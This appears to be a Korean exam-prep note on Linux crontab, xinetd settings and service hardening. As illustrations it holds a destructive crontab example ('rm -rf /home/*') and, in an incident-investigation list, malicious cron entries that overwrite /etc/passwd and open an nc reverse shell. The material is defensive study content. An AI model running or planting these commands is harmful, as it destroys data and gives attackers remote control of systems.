---
title: crontab · xinetd · 리눅스 서비스 보안
domain: 시스템보안
questions: [7-14, 8-15, 9-12, 12-5, 24-18, 30-17, 12-14]
tags: [crontab, xinetd, logrotate, TMOUT, securetty, 서비스하드닝]
---

## crontab

```
분  시  일  월  요일   명령
 0   3   *   *   0     rm -rf /home/*    # 매주 일요일 03:00
```

| 명령 | 용도 |
|---|---|
| `crontab -l` | 현재 등록 조회 |
| `crontab -e` | 편집 |
| `crontab -u user -e` | 특정 사용자 것 편집 |
| `/etc/cron.allow` `/etc/cron.deny` | 사용 허용/거부 목록 |

**침해 조사**: cron / at / systemd timer 에 등록된 비인가 작업 점검
- `0 0 6 * * root cp /tmp/passwd1 /etc/passwd` → 계정 파일 변조
- `0 0 12 * * root nc 10.10.10.10 80 -e /bin/bash` → **리버스 셸** (80포트 위장, 아웃바운드 우회)

## xinetd (`/etc/xinetd.d/서비스`)

| 속성 | 의미 |
|---|---|
| `disable = yes` | **서비스 비활성화** (불필요 서비스 차단) |
| `only_from = 192.168.10.0/24` | 접속 허용 대역 |
| `no_access = 10.0.0.0/8` | 접속 차단 대역 |
| `instances = 50` | 동시 서버 프로세스 수 (DoS 완화) |
| `per_source = 10` | 출발지 IP당 동시 연결 수 |
| `cps = 10 5` | 초당 연결 10개 초과 시 5초 차단 |
| `access_times = 09:00-18:00` | 서비스 허용 시간대 |
| `log_on_failure += USERID` | 실패 시 USERID 로깅 |

## 기타 하드닝

| 항목 | 설정 |
|---|---|
| 세션 타임아웃 | `/etc/profile` 에 `export TMOUT=600` |
| 콘솔 root 로그인 제한 | `/etc/securetty` (허용 tty만, 비우면 차단) |
| SSH root 로그인 | `/etc/ssh/sshd_config` → `PermitRootLogin no` |
| r 명령 신뢰파일 | `/etc/hosts.equiv`, `~/.rhosts` → 소유자 root, 권한 600, `+` 제거 (SSH로 대체) |
| 로그 순환 | `logrotate` (`weekly`, `rotate N`, `compress`, `create`) |
| 계정 잠금 | PAM `pam_faillock` / `pam_tally2` (`deny=5 unlock_time=120`) |
| SUID/SGID | `find / -perm -4000 -o -perm -2000` 후 불필요분 `chmod -s` |
